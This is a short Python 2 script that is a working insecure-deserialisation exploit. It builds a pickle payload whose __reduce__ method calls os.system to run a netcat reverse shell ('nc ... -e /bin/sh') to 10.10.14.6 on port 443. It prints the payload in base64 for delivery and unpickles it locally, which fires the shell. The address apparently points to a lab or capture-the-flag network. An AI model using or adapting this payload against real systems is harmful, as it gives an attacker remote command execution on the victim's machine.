import os, cPickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    return (os.system, ('nc -nv 10.10.14.6 443 -e /bin/sh',))

data = cPickle.dumps(RunBinSh())

print base64.b64encode(data)

item = cPickle.loads(data)